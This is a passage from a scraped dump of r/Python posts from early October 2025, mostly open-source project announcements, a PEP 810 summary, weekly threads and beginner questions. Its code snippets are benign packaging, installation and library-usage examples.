* Global hooks route string paths for `pygame.image.load`, `pygame.mixer.Sound`, and `pygame.mixer.music.load` ‚Üí fewer path bugs after packaging.
* **Audio init** on Windows is hardened (`ensure_audio()` tries multiple drivers/buffer sizes).
* **Animated GIF** support via **Pillow** (e.g., winner screen fireworks ‚Üí frames + per-frame duration).
* Comes with a one-command **build script** (PowerShell) and a **SHA-256** file for integrity checks.

**How Python Is Used**

* **pygame** for windowing, scenes, input, and rendering.
* **Pillow** to decode animated GIFs into (surface, duration) frames.
* **PyInstaller** (one-file) to ship a single `.exe`.

**Minimal snippets (the core ideas):**

    # resource_path: dev + PyInstaller (_MEIPASS) friendly
    from pathlib import Path
    import sys
    def resource_path(*parts):
        if hasattr(sys, ""_MEIPASS""):
            base = Path(sys._MEIPASS)
        else:
            here = Path(__file__).resolve()
            base = next((p for p in [here] + list(here.parents) if (p / ""assets"").exists()), here)
        return str((base / Path(*parts)).resolve())
    

    # global hooks so string paths work after packaging, too
    import pygame
    _orig_img = pygame.image.load
    def _img_wrapped(path, *a, **kw):
        from utils import resource_path
        if isinstance(path, str): path = resource_path(path)
        return _orig_img(path, *a, **kw)
    pygame.image.load = _img_wrapped
    
    # similar tiny wrappers exist for pygame.mixer.Sound and pygame.mixer.music.load
    

**Run from Source**

    git clone https://github.com/rozsit/112_PyClue_Game
    cd 112_PyClue_Game
    python -m venv .venv
    .\.venv\Scripts\activate           # Windows
    pip install -r requirements.txt
    python main.py
    

**Downloads (Windows .exe)**  
Grab the one-file build from the Release page:  
[https://github.com/rozsit/112\_PyClue\_Game/releases/tag/v1.0.0](https://github.com/rozsit/112_PyClue_Game/releases/tag/v1.0.0)

**(Optional) Verify SHA-256 on Windows**

    Get-FileHash .\PyClue.exe -Algorithm SHA256
    # or
    certutil -hashfile .\PyClue.exe SHA256
    

The output should match the `PyClue.exe.sha256` provided in the release.

**Roadmap / PRs Welcome**

* New boards, items, rule variants
* Simple AI opponents
* Local/online multiplayer
* Localization (EN/HU)
* Save/load & stats

I‚Äôd love feedback on packaging tricks (PyInstaller + pygame), audio reliability on different Windows setups, and ergonomics of the scene/asset layout."
1nx12sv,How to Level Up Your Python Logs with Structlog,finallyanonymous,26,13,2025-10-03 14:43:30,https://www.reddit.com/r/Python/comments/1nx12sv/how_to_level_up_your_python_logs_with_structlog/,"For modern applications, structured and context-aware logging is essential for observability. [Structlog](https://www.structlog.org/) is one of the better tools in the Python ecosystem for achieving this with a more intuitive model than the standard logging's system of handlers, formatters, and filters.

[I wrote a guide](https://www.dash0.com/guides/python-logging-with-structlog) that provides a step-by-step walkthrough for implementing clean, production-ready logging with Structlog.

Keen to hear your thoughts, and if you think it's worth switching to from the `logging` module."
1nx0oxk,PEP 810 ‚Äì Explicit lazy imports,JanEric1,461,148,2025-10-03 14:28:35,https://www.reddit.com/r/Python/comments/1nx0oxk/pep_810_explicit_lazy_imports/,"PEP: https://pep-previews--4622.org.readthedocs.build/pep-0810/

Discussion: https://discuss.python.org/t/pep-810-explicit-lazy-imports/104131

This PEP introduces lazy imports as an explicit language feature. Currently, a module is eagerly loaded at the point of the import statement. Lazy imports defer the loading and execution of a module until the first time the imported name is used.

By allowing developers to mark individual imports as lazy with explicit syntax, Python programs can reduce startup time, memory usage, and unnecessary work. This is particularly beneficial for command-line tools, test suites, and applications with large dependency graphs.

The proposal preserves full backwards compatibility: normal import statements remain unchanged, and lazy imports are enabled only where explicitly requested."
1nwy2zb,OCR-StringDist - Learn and Fix OCR Errors,NiklasvonM,7,0,2025-10-03 12:43:16,https://www.reddit.com/r/Python/comments/1nwy2zb/ocrstringdist_learn_and_fix_ocr_errors/,"# What My Project Does

I built this library to fix errors in product codes read from images.

For example, ""O"" and ""0"" look very similar and are therefore often mixed up by OCR models. However, most string distance implementations do not consider character similarity.

Therefore, I implemented a weighted Levenshtein string distance with configurable costs on a character- or token-level.

These weights can either be configured manually or they can be learned from a dataset of (read, true) labels using a probabilistic learning algorithm.

# Basic Usage

    from ocr_stringdist import WeightedLevenshtein
    
    training_data = [
        (""128"", ""123""), # 3 misread as 8
        (""567"", ""567""),
    ]
    # Holds learned substitution, insertion and deletion weights
    wl = WeightedLevenshtein.learn_from(training_data)
    
    ocr_output = ""Product Code 148""
    candidates = [
        ""Product Code 143"",
        ""Product Code 848"",
    ]
    distances: list[float] = wl.batch_distance(ocr_output, candidates)

# Target Audience

Professionals who work on data extraction from images.

# Comparison

There are multiple string distance libraries, such as [rapidfuzz](https://github.com/rapidfuzz/RapidFuzz), [jellyfish](https://github.com/jamesturk/jellyfish), [textdistance](https://github.com/life4/textdistance) and [weighted-levenshtein](https://github.com/infoscout/weighted-levenshtein), with most of them being a bit faster and having more diverse string distances.

However, there are very few good implementations that support character- or token-level weights and I am not aware of any that support learning weights from training data.

# Links

[Repository](https://github.com/NiklasvonM/ocr-stringdist) [pypi](https://pypi.org/project/ocr-stringdist/) [Documentation](https://niklasvonm.github.io/ocr-stringdist/)

I'm grateful for any feedback and hope that my project might be useful to someone."
1nwxqad,Simulate Apache Spark Workloads Without a Cluster using FauxSpark,No_Direction_5276,7,1,2025-10-03 12:27:12,https://www.reddit.com/r/Python/comments/1nwxqad/simulate_apache_spark_workloads_without_a_cluster/,"**What My Project Does**

[FauxSpark](https://github.com/fhalde/fauxspark) is a discrete event simulation of Apache Spark using SimPy. It lets you experiment with Spark workloads and cluster configurations without spinning up a real cluster ‚Äì perfect for testing failures, scheduling, or capacity planning to observe the impact it has on your workload.

The first version includes:

* DAG scheduling with stages, tasks, and dependencies
* Automatic retries on executor or shuffle-fetch failures
* Single-job execution with configurable cluster parameters
* Simple CLI to tweak cluster size, simulate failures, and scaling up executors

**Target Audience**

* **Data & Infrastructure engineers** running Apache Spark who want to experiment with cluster configurations
* Anyone curious about **Spark internals**

I'd love feedback from anyone with experience in discrete event simulation, especially on the planned features, as well as from anyone who found this useful. I have created some example DAGs for you to try it out!

GH repo [https://github.com/fhalde/fauxspark](https://github.com/fhalde/fauxspark)"
1nwxo9z,"Real-time Air Quality Monitoring with Python, BLE, and Ubidots",bleuio,1,0,2025-10-03 12:24:40,https://www.reddit.com/r/Python/comments/1nwxo9z/realtime_air_quality_monitoring_with_python_ble/,"Built a real-time air quality monitoring system in Python using a BleuIO dongle and visualize in Ubidots. It listens to BLE packets from a HibouAir sensor, decodes CO2/temperature/humidity, and streams the data to a live dashboard.  
[https://www.bleuio.com/blog/connecting-bleuio-to-ubidots-a-practical-industrial-iot-air-quality-solution/](https://www.bleuio.com/blog/connecting-bleuio-to-ubidots-a-practical-industrial-iot-air-quality-solution/)"
1nwv8re,pyya - Simple tool that converts YAML/TOML configuration files to Python objects,wit4er,22,6,2025-10-03 10:19:40,https://www.reddit.com/r/Python/comments/1nwv8re/pyya_simple_tool_that_converts_yamltoml/,"New version 0.1.11 is ready, now *pyya* can convert and validate configuaration from TOML files. In the previous version, I also added a CLI tool to generate stub files from your YAML/TOML configuaration fil, so that tools like mypy can validate type hints and varoius LSPs can autocomplete dynamic attribute-style dictionary. Check README for more info. Contributions/suggestions are welcome as always.

Check GitHub Page: [https://github.com/shadowy-pycoder/pyya](https://github.com/shadowy-pycoder/pyya)  
Check PyPi Page: [https://pypi.org/project/pyya/](https://pypi.org/project/pyya/)"
1nws4l2,"Introducing Aird ‚Äì A Lightweight, Cross-Device File Sharing Tool",Good-Definition-7148,4,3,2025-10-03 07:00:22,https://www.reddit.com/r/Python/comments/1nws4l2/introducing_aird_a_lightweight_crossdevice_file/,"Hi everyone,

I'm excited to share my open-source project called Aird.

# What My Project Does

Aird is a simple and efficient file-sharing web server built with Python Tornado. It's designed to help you quickly share files across devices on the same network or remotely. It provides a clean web interface for file management and utilizes WebSockets for real-time transfer updates, ensuring a smooth user experience.

# Target Audience

This tool is for developers, sysadmins, or anyone looking for a straightforward alternative to cumbersome file-sharing applications. It is well-suited for both technical and non-technical users who need a quick way to transfer files in a local network, for remote sharing, or within collaborative environments. It can be used as a personal project or deployed in a production setting for teams.

# Comparison

Unlike many popular file-sharing services that rely on third-party cloud servers, Aird is self-hosted, giving you complete control over your data. Compared to other local-first tools, Aird offers a modern web UI and real-time updates via WebSockets, which many simpler scripts or command-line tools lack. Its lightweight nature and minimal setup also make it a more efficient alternative to heavier, resource-intensive solutions.

# Key Features:

* Cross-device file sharing with instant web-based access
* WebSocket-based real-time file transfers and updates
* Minimal setup, lightweight, and great performance
* Web UI for easy file management and uploads
* Perfect for local networks, remote sharing, or collaborative environments

The code is fully open-source, and contributions are welcome. Give Aird a try!

**GitHub link:**¬†[`https://github.com/blinkerbit/aird`](https://github.com/blinkerbit/aird)

I'd love to hear your feedback, ideas, or feature requests! Thanks for checking it out"
1nwnr98,PyThermite - Rust backed object indexer,Interesting-Frame190,43,17,2025-10-03 02:51:04,https://www.reddit.com/r/Python/comments/1nwnr98/pythermite_rust_backed_object_indexer/,"Attention ‚ö†Ô∏è : NOT another AI wrapper

Beta released today - open to feedback - especially bugs

https://github.com/tylerrobbins5678/PyThermite

https://pypi.org/project/pythermite/

-**what My Project Does**

PyThermite is a rust backed python object indexer that supports nested objects and queries with real-time data. In plain terms, this means that complex data relations can be conveyed in objects, maintained state, and queried easily. For example, if I have a list of 100k cars in a city and want to get a list of cars moving between 20 and 40 mph and the owner of the car is named ""Jim"" that was born after 2005, that can be a single built query with sub 1 ms response. Keep in mind that the cars speed is constantly changing, updating the data structures as it goes.

In testing, its significantly (20- 50x) faster than pandas dataframe filtering on a data size of 100k. Query time complexity is roughly O(q + r) where q is the amount of query operations (and, or, in, eq, gt, nesting, etc) and r is the result size. 

The cost to index is defined paid and building the structure takes around 6-7x longer than a dataframe consuming a list, but definitely worth it if the data is queried more than 3-4 times

Performance has been and is still a constant battle with the hashmap and b-tree inserts consuming most of the process time. 

-**Target Audience**

Currently this is not production ready as it is not tested thoroughly. Once proven, it will be supported and continue driving towards ETL and simulation within OOP driven code. At this current state it should only be used for analytics and analysis 

-**Conparison**

This competes with traditional dataframes like arrow, pandas, and polars, except it is the only one that handles native objects internally as well as indexes attributes for highly performant lookup. There's a few small alternatives out there, but nothing written with this much focus on performance."
1nwk7ps,Friday Daily Thread: r/Python Meta and Free-Talk Fridays,AutoModerator,3,0,2025-10-03 00:00:51,https://www.reddit.com/r/Python/comments/1nwk7ps/friday_daily_thread_rpython_meta_and_freetalk/,"# Weekly Thread: Meta Discussions and Free Talk Friday üéôÔ∏è

Welcome to Free Talk Friday on /r/Python! This is the place to discuss the r/Python community (meta discussions), Python news, projects, or anything else Python-related!

## How it Works:

1. **Open Mic**: Share your thoughts, questions, or anything you'd like related to Python or the community.
2. **Community Pulse**: Discuss what you feel is working well or what could be improved in the /r/python community.
3. **News & Updates**: Keep up-to-date with the latest in Python and share any news you find interesting.

## Guidelines:

* All topics should be related to Python or the /r/python community.
* Be respectful and follow Reddit's [Code of Conduct](https://www.redditinc.com/policies/content-policy).

## Example Topics:

1. **New Python Release**: What do you think about the new features in Python 3.11?
2. **Community Events**: Any Python meetups or webinars coming up?
3. **Learning Resources**: Found a great Python tutorial? Share it here!
4. **Job Market**: How has Python impacted your career?
5. **Hot Takes**: Got a controversial Python opinion? Let's hear it!
6. **Community Ideas**: Something you'd like to see us do? tell us.

Let's keep the conversation going. Happy discussing! üåü"
1nwi0jd,PyCharm Pro Gift Code | 1-Year FREE,DrDeems,78,31,2025-10-02 22:23:40,https://www.reddit.com/r/Python/comments/1nwi0jd/pycharm_pro_gift_code_1year_free/,"**Hail**, fellow Python lovers!

I randomly found a great deal today. I was going to subscribe to PyCharm Pro monthly for personal use (they have a few features that integrate with GCloud I would like to leverage). On the checkout page, I saw a ""Have a gift code?"" prompt. I googled ""PyCharm Pro coupon code"" or something like that.

One of the first few websites in the results had a handful of coupons listed to use. First try, boom 25% off, not bad. Second try, boom 25% off again, not bad. Third try, boom... wait... 100 percent off, what in the hell?!?! I selected PayPal as my payment option. Since the total was $0.00, it did not ask me for my PayPal email. It showed the purchase success page with a receipt for $0.00. Paying nothing for a product that normally costs $209.99/year felt pretty good!

The coupon code you enter on the checkout page is:

**Chand\_Sheikh**

You can only redeem the Gift Code once per account! You can choose one of the eleven IDEs offered by IntelliJ (PyCharm, PHPStorm, RustRover, RubyMine, ReSharper, etc, etc.). So choose wisely!

The only thing I ask in return for this information is that you take a moment to try to make someone else's day a bit better üíñ It can be anyone. Spread love!

**TLDR**: You can get a free year of one of the eleven premium IDEs IntelliJ sells by using the gift code ""*Chand\_Sheikh*"". Do something to make another person's day a bit better.

*Parts of this post were* ***NOT*** *written with ChatGPT or Ai. I prefer to add my own touch.*"
1nwhu1f,"An interesting open-source tool for turning LLM prompts into testable, version-controlled artifacts.",FarCardiologist7256,0,0,2025-10-02 22:16:17,https://www.reddit.com/r/Python/comments/1nwhu1f/an_interesting_opensource_tool_for_turning_llm/,"Hey everyone,

If you've been working with LLMs in Python, you've probably found yourself juggling complex f-strings or Jinja templates to manage your prompts. It can get messy fast, and there's no good way to test or version them.

I wanted a more robust, ""Pythonic"" way to handle this, so I built ProML (Prompt Markup Language).

It's an open-source toolchain, written in Python and installable via pip, that lets you define, test, and manage prompts as first-class citizens in your project.

Instead of just strings, you define prompts in .proml files, which are validated against a formal spec. You can then load and run them easily within your Python code:

import proml

Load a structured prompt from a file

prompt = proml.load(""prompts/sentiment_analysis.proml"")

Execute it with type-safe inputs

result = prompt.run(comment=""This is a great product!"")

print(result.content)

=> ""positive""

Some of the key features:

Pure Python & Pip Installable: The parser, runtime, and CLI are all built in Python.

Full CLI Toolchain: Includes commands to lint, fmt, test, run, and publish your prompts.

Testing Framework: You can define test cases directly in the prompt files to validate LLM outputs against regex, JSON Schema, etc.

Library Interface: Designed to be easily integrated into any Python application

Versioning & Registry: A local registry system to manage and reuse prompts across projects with semver.

I'm the author and would love to get feedback from the Python community. What do you think of this approach?

You can check out the source and more examples on GitHub, or install it and give it a try.

GitHub: https://github.com/Caripson/ProML

Docs : https://github.com/Caripson/ProML/blob/main/docs/index.md

Target audience: LLM developers, prompt-engineers 

Comparison: haven‚Äôt found any similar "
1nwhdmt,Snakebar ‚Äî a tqdm-style progress bar that snakes across your terminal,Library-Extra,78,21,2025-10-02 21:58:11,https://www.reddit.com/r/Python/comments/1nwhdmt/snakebar_a_tqdmstyle_progress_bar_that_snakes/,"## What My Project Does  
Snakebar is a `tqdm`-like progress bar for Python. Instead of a plain horizontal bar, it draws a one-character snake that fills your terminal via a random space-filling curve.    
It still reports percentage, iterations done, ETA, and rate (it/s), but makes waiting more fun.  
  
## Target Audience  
Anyone who runs long scripts, pipelines, or training loops ‚Äî data scientists, ML engineers, researchers, developers with heavy ETL or simulations.    
It‚Äôs meant as a lightweight library you can drop in as a direct replacement for `tqdm`. It‚Äôs production-ready but also works fine as a fun toy project in personal scripts.  
  
## Comparison  
Compared to `tqdm`:  
- Same semantics (`snake_bar` works like `tqdm`).  
- Still shows % complete, ETA, and rate.  
- Instead of a static bar, progress is visualized as a snake filling the screen.  
- Fits automatically to your terminal size.  
  
## Installation  
```bash  
pip install snakebar  
```

## Links  
- PyPI: [https://pypi.org/project/snakebar/](https://pypi.org/project/snakebar/)  
- GitHub: [https://github.com/majoburo/snakebar](https://github.com/majoburo/snakebar)  
- License: MIT"
1nweuv0,BuildLog: a simple tool to track and version your Python builds,Frosty-Jackfruit-977,0,0,2025-10-02 20:22:30,https://www.reddit.com/r/Python/comments/1nweuv0/buildlog_a_simple_tool_to_track_and_version_your/,"Hey r/Python! üëã

I‚Äôd like to share BuildLog, a Python CLI tool for tracking and versioning build outputs. It‚Äôs designed for standalone executables built with PyInstaller, Nuitka, or any other build command.

# What my project does

Basically, when you run a build, BuildLog captures all the new files/folders built at the current state of your repository, recording SHA256 hashes of executables, and logging Git metadata (commit, branch, tags, commit message). Everything goes into a .buildlog folder so you can always trace which build came from which commit.

One cool thing: it doesn‚Äôt care which build tool you use. It basically just wraps whatever command you pass and tracks what it produces. So even if you use something other than PyInstaller or Nuitka, it should still work.

# Target Audience

- Python developers building standalone executables.

- Teams that need reproducible builds and clear history.

- Anyone needing traceable builds.

# Comparison

I did not find similar tools to match my use cases, so I thought to build my own and I‚Äôm now happy to share it with you. Any feedback is welcome. 

Check it out here to find more:  [BuildLog](https://github.com/adghin/buildlog) ‚Äì if you like it, feel free to give it a ‚≠ê!"
1nweioo,Python code for battleship game,Outrageous_Willow603,0,4,2025-10-02 20:09:41,https://www.reddit.com/r/Python/comments/1nweioo/python_code_for_battleship_game/,"Hi everyone, does anyone have a code made in python to make a battleship game? Or probably from any other game that is ‚Äúeasy‚Äù. "
1nwd03c,My new package in pypi,madpool04,0,8,2025-10-02 19:13:14,https://www.reddit.com/r/Python/comments/1nwd03c/my_new_package_in_pypi/,"https://github.com/keikurono7/keywordx
https://pypi.org/project/keywordx/

What my project does:
This package helps you extract keywords from sentences not only by similarity but even context related. It needs improvement but this is the initial stage.

Target audience:
It can be used in any field from digital assistant to web search. This package integration helps in getting important information in more better way. 

Comparison:
Unlike other keyword extractor tools it is not limited to date and time or not a similar word marker. It finds the best match based on the meanings the whole sentence gives 

Comment for any suggestions or anything "
1nwb0fy,Real-time crypto pattern recognition dashboard built with Python + Dash,Noveim,0,2,2025-10-02 17:59:16,https://www.reddit.com/r/Python/comments/1nwb0fy/realtime_crypto_pattern_recognition_dashboard/,"Hi all,

I'm trying to build a real-time crypto pattern recognition dashboard using Python, Dash, and CCXT. It allows you to:

\- Predict the future by comparing real-time cryptocurrency charts with past chart patterns.

\- Limit pattern selection to avoid duplicates.

\- Analyze multiple coins (BTC, ETH, XRP) with an optional heatmap.

I'm new to programming and currently using ChatGPT to bring my idea to real life. But I realized that ChatGPT and I alone wouldn't achieve what I wanted. 

Repo: [https://github.com/JuNov03/crypto-pattern-dashboard](https://github.com/JuNov03/crypto-pattern-dashboard)

Looking for suggestions to improve pattern detection accuracy and UI/UX.

Thanks!"
1nwa9zx,Hello! I‚Äôm very new in tech industry and right now I went to learn. Which  language should I learn?,Ok-Ambassador-9114,0,5,2025-10-02 17:32:44,https://www.reddit.com/r/Python/comments/1nwa9zx/hello_im_very_new_in_tech_industry_and_right_now/,"Is there any private classes to take? I really want to learn and develop app, website and so‚Ä¶. But I don‚Äôt new where to start, can someone support my? "
1nw7gah,Released Agent Builder project. Looking for feedback!,Effective-Ad2060,0,3,2025-10-02 15:48:03,https://www.reddit.com/r/Python/comments/1nw7gah/released_agent_builder_project_looking_for/,"Hi everyone!

I‚Äôve been working on a project called **PipesHub**, an open-source developer platform for building AI agent pipelines that integrate with real-world business data.

The main idea: teams often need to connect multiple apps (like Google Drive, Gmail, Confluence, Jira, etc.) and provide that context to agents. PipesHub makes it easier to set up those connections, manage embeddings, and build production-ready retrieval pipelines.

**What the project does**

* Provides connectors for major business apps
* Supports embedding and chat models through standard endpoints
* Includes tools like CSV/Excel/Docx/PPTX handling, web search, coding sandbox, etc.
* Offers APIs and SDKs so developers can extend and integrate quickly
* Designed to be modular: you can add connectors, filters, or agent tools as needed

**Target audience**  
This project is mainly for developers who want to experiment with building agent-based applications that need enterprise-style context. It‚Äôs still evolving, but I‚Äôd love feedback on design, structure, and developer experience.

**Repo**: [https://github.com/pipeshub-ai/pipeshub-ai](https://github.com/pipeshub-ai/pipeshub-ai)

Any suggestions, critiques, or contributions are super welcome üôè"
1nw694f,Alimentar un asistente de GPT,Unable_Campaign6018,0,2,2025-10-02 15:03:33,https://www.reddit.com/r/Python/comments/1nw694f/alimentar_un_asistente_de_gpt/,"Hola gente de reddit, estoy desarrollando una aplicaci√≥n conversacional en la uso python de la mano de Streamlit, invoco a un asistente que hice en ChatGPT para que mantenga la conversaci√≥n, el almacenamiento de las conversaciones lo hago por sesi√≥n, pero me gustar√≠a mantener un registro y as√≠ el los usuarios puedan recuperar conversaciones pasadas y el asistente pueda estar alimentado. ¬øComo lo podr√≠a ver donde almacenar las conversaciones? Todav√≠a soy algo poco experimentado en asistentes de GPT, pero ¬øEstos se pueden alimentar? Acepto recomendaciones y preguntas! "
1nw3xsy,"The list `awesome polars` close to 1,000 stars ü§©",damiendotta,0,1,2025-10-02 13:34:21,https://www.reddit.com/r/Python/comments/1nw3xsy/the_list_awesome_polars_close_to_1000_stars/,"\`awesome polars\` is close to reaching 1,000 stars on GitHub.

If you are interested in the Polars project, go take a look.

[https://github.com/ddotta/awesome-polars](https://github.com/ddotta/awesome-polars)"
1nw0gy6,Exercises to Build the Right Mental Model for Python Data,Sea-Ad7805,1,0,2025-10-02 10:50:23,https://www.reddit.com/r/Python/comments/1nw0gy6/exercises_to_build_the_right_mental_model_for/,"An exercise to build the right mental model for Python data. The ‚ÄúSolution‚Äù link below uses memory\_graph to visualize execution and reveal what‚Äôs actually happening.

What is the output of this Python program?

    a = [1]
    b = a
    b += [2]
    b.append(3)
    b = b + [4]
    b.append(5)
    
    print(a)
    # --- possible answers ---
    # A) [1]
    # B) [1, 2]
    # C) [1, 2, 3]
    # D) [1, 2, 3, 4]
    # E) [1, 2, 3, 4, 5]

* [Solution](https://memory-graph.com/#codeurl=https://raw.githubusercontent.com/bterwijn/memory_graph_videos/refs/heads/main/exercises/exercise9.py&play)
* [Explanation](https://github.com/bterwijn/memory_graph?tab=readme-ov-file#python-data-model)
* [More Exercises](https://www.reddit.com/r/Python_memory_graph/)"
1nvy1iv,Local image and video classification tool using Google's sigLIP 2 So400m (naflex),AnywhereTypical5677,4,0,2025-10-02 08:19:52,https://www.reddit.com/r/Python/comments/1nvy1iv/local_image_and_video_classification_tool_using/,"Hey everyone! I built a tool to search for images and videos locally using natural language with [Google's sigLIP 2 model](https://huggingface.co/google/siglip2-so400m-patch16-naflex).

I'm looking for people to test it and share feedback, especially about how it runs on different hardware.

Don't mind the ugly GUI, I just wanted to make it as simple and accessible as possible, but you can still use it as a command line tool anyway if you want to. You can find the repository here: [https://github.com/Gabrjiele/siglip2-naflex-search](https://github.com/Gabrjiele/siglip2-naflex-search)

# What My Project Does

My project, `siglip2-naflex-search`, is a desktop tool that lets you search your local image and video files using natural language. You can find media by typing a description (of varying degrees of complexity) or by using an existing image to find similar ones. It features both a user-friendly graphical interface and a command-line interface for automation. The tool uses Google's powerful SigLIP 2 model to understand the content of your files and stores the data locally in an SQLite database for fast, private searching.

# Target Audience

This tool is designed for anyone with a large local collection of photos and videos who wants a better way to navigate them. It is particularly useful for:

* **Photographers and videographers** needing to quickly find specific shots within their archives.
* **AI enthusiasts and developers** looking for a hands-on project that uses a SOTA vision-language model.
* **Privacy-conscious users** who prefer an offline solution for managing their personal media without uploading it to the cloud.

**IT IS NOT INTENDED FOR LARGE SCALE ENTERPRISE PRODUCTION**.

# Comparison

This project stands apart from alternatives like `rclip` and other search tools built on the original CLIP model in a few significant ways:

* **Superior model**: It is built on **Google's SigLIP 2**, a more recent and powerful model that provides better performance and efficiency in image-text retrieval compared to the original CLIP used by `rclip`. SigLIP 2's training method leads to improved semantic understanding.
* **Flexible resolution (NaFlex)**: The tool utilizes the `naflex` variant of SigLIP 2, which can process images at various resolutions while preserving their original aspect ratio. This is a major advantage over standard CLIP models that often resize images to a fixed square, which can distort content and reduce accuracy (especially in OCR applications).
* **GUI and CLI**: Unlike `rclip` which is primarily a command-line tool, this project offers both a **very simple graphical interface (will update in the future) and a command line interface**. This makes it accessible to a broader audience, from casual users to developers who need scripting capabilities.
* **Integrated video search**: It's one of the very few tools that provides video searching as a built-in feature: it extracts and indexes frames to make video content searchable out of the box."
1nvvsub,OneCode ‚Äî Python library to turn scripts into deployable apps,goochop,51,4,2025-10-02 05:58:48,https://www.reddit.com/r/Python/comments/1nvvsub/onecode_python_library_to_turn_scripts_into/,"# What My Project Does

**OneCode** is an open-source Python library that lets you convert your scripts to apps with minimal boilerplate. Using simple decorators/parameters, you define inputs/outputs, and OneCode automatically generates a UI for you.

Github link is here: [https://github.com/deeplime-io/onecode](https://github.com/deeplime-io/onecode)

On **OneCode Cloud**, those same apps can be deployed instantly, with authentication, scaling, and access controls handled for you.

The cloud platform is here: [https://www.onecode.rocks/](https://www.onecode.rocks/) (free tier includes 3 apps, 1Gb of storage and up to 5 hours of compute).

OneCode allows you to run the same code locally or on the cloud platform (one code ;)). You can connect your github account and automatically sync code to generate the app.

# Target Audience

* **Python developers** who want to share tools without building a web frontend
* **Data scientists / researchers** who need to wrap analysis scripts with a simple interface
* **Teams** that want internal utilities, but don‚Äôt want to manage deployment infrastructure
* Suitable for **production apps** (access-controlled, secure), but lightweight enough for **prototyping and demos**.

# Comparison

* Unlike **Streamlit/Gradio**, OneCode doesn‚Äôt focus on dashboards, instead it auto-generates minimal UIs from your function signatures. OneCode cloud is also usable with long running compute, big machines are available, and compute is scalable with the number of users.
* Unlike **Flask/FastAPI**, you don‚Äôt need to wire up endpoints, HTML, or auth, it‚Äôs all handled automatically.
* The **cloud offering** provides secure runtime, scaling, and sharing out of the box, whereas most libraries stop at local execution.

Code examples:

`INPUTS`

    `# instead of: df = pd.read_csv('test.csv')`
    
    `df = csv_reader('your df', 'test.csv')`
    
    
    
    `# instead of: for i in range(5):`
    
    `for i in range(slider('N', 5, min=0, max=10)):  # inlined`
        # do stuff

    `# instead of: choice = 'cat'`
    
    `choice = dropdown('your choice', 'cat', options=['dog', 'cat', 'fish'])` 
    
    `#not inlined`
    
    `Logger.info(f'Your choice is {choice}')`

`OUTPUTS`

    `# instead of: plt.savefig('stuff.png')`
    
    `plt.savefig(file_output('stuff', 'stuff.png'))  # inlined`
    
    
    
    `# instead of: filepath = 'test.txt'`
    
    `filepath = file_output('test', 'test.txt')  # not inlined`
    
    `with open(filepath, 'w') as f:`
          # do stuff



Happy to answer questions or provide more examples! We have a few example apps on the cloud already which are available to everyone. You can find a webinar on the library and cloud here:

[https://www.youtube.com/watch?v=BPj\_cbRUwLk](https://www.youtube.com/watch?v=BPj_cbRUwLk)

We are looking for any feedback at this point! cheers"
1nvoqx0,"Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",AutoModerator,5,0,2025-10-02 00:00:38,https://www.reddit.com/r/Python/comments/1nvoqx0/thursday_daily_thread_python_careers_courses_and/,"# Weekly Thread: Professional Use, Jobs, and Education üè¢

Welcome to this week's discussion on Python in the professional world! This is your spot to talk about job hunting, career growth, and educational resources in Python. Please note, this thread is **not for recruitment**.

---

## How it Works:

1. **Career Talk**: Discuss using Python in your job, or the job market for Python roles.
2. **Education Q&A**: Ask or answer questions about Python courses, certifications, and educational resources.
3. **Workplace Chat**: Share your experiences, challenges, or success stories about using Python professionally.

---

## Guidelines:

- This thread is **not for recruitment**. For job postings, please see r/PythonJobs or the recruitment thread in the sidebar.
- Keep discussions relevant to Python in the professional and educational context.
  
---

## Example Topics:

1. **Career Paths**: What kinds of roles are out there for Python developers?
2. **Certifications**: Are Python certifications worth it?
3. **Course Recommendations**: Any good advanced Python courses to recommend?
4. **Workplace Tools**: What Python libraries are indispensable in your professional work?
5. **Interview Tips**: What types of Python questions are commonly asked in interviews?

---

Let's help each other grow in our careers and education. Happy discussing! üåü"
1nvnyjr,Open Source Google Maps Street View Panorama Scraper.,yousephx,30,4,2025-10-01 23:25:10,https://www.reddit.com/r/Python/comments/1nvnyjr/open_source_google_maps_street_view_panorama/,"  
**What My Project Does**  
  
\- With [gsvp-dl](https://github.com/yousephzidan/gsvp-dl), an open source solution written in Python, you are able to download millions of panorama images off Google Maps Street View.

**Comparison**

\- Unlike other existing solutions (which fail to address major edge cases), [gsvp-dl](https://github.com/yousephzidan/gsvp-dl) downloads panoramas in their correct form and size with unmatched accuracy. Using Python Asyncio and Aiohttp, it can handle bulk downloads, scaling to millions of panoramas per day.

\- Other solutions don‚Äôt match up because they ignore edge cases, especially pre-2016 images with different resolutions. They used fixed width and height that only worked for post-2016 panoramas, which caused black spaces in older ones.

**Target Audience**¬†

""For educational purposes only"" ***- just in case Google is watching.*** 

It was a fun project to work on, as there was no documentation whatsoever, whether by Google or other existing solutions. So, I documented the key points that explain why a panorama image looks the way it does based on the given inputs (mainly zoom levels).

The way I was able to reverse engineer Google Maps Street View API was by sitting all day for a week, doing nothing but observing the results of the endpoint, testing inputs, assembling panoramas, observing outputs, and repeating. With no documentation, no lead, and no reference, it was all trial and error.

I believe I have covered most edge cases, though I still doubt I may have missed some. Despite testing hundreds of panoramas at different inputs, I‚Äôm sure there could be a case I didn‚Äôt encounter. So feel free to fork the repo and make a pull request if you come across one, or find a bug/unexpected behavior.

Thanks for checking it out!"
1nvjw17,14-year-old here teaching Python basics on YouTube ‚Äì made this course for students like me,Separate_Airline_427,0,1,2025-10-01 20:41:03,https://www.reddit.com/r/Python/comments/1nvjw17/14yearold_here_teaching_python_basics_on_youtube/,"Hey everyone! I'm 14 and I've been learning computer science for a while now. I realized there aren't many beginner-friendly Python tutorials made BY teens FOR teens (and college students too), so I decided to create my own course on YouTube.

I'm covering all the fundamentals ‚Äì variables, loops, functions, and working up to more interesting projects. My goal is to explain things the way I wish someone had explained them to me when I was starting out.

I'd really appreciate a view or subscribe! Every bit of support helps me keep making content and improving the course.


Channel Name: Bytesize Code

https://youtube.com/@hussein-bytesizecode?si=dlmY53Z2pbeS81vu"
1nviqak,Free Release - Vanity-S.E.T.,SassyKassy21,0,1,2025-10-01 19:58:35,https://www.reddit.com/r/Python/comments/1nviqak/free_release_vanityset/,"https://github.com/SolSpliff/Vanity-SET

I‚Äôve released my Python script, fully open source on GitHub which generates Vanity wallets for: Sol, Eth & Ton.

Enjoy. Any issues, open a ticket or push an update."
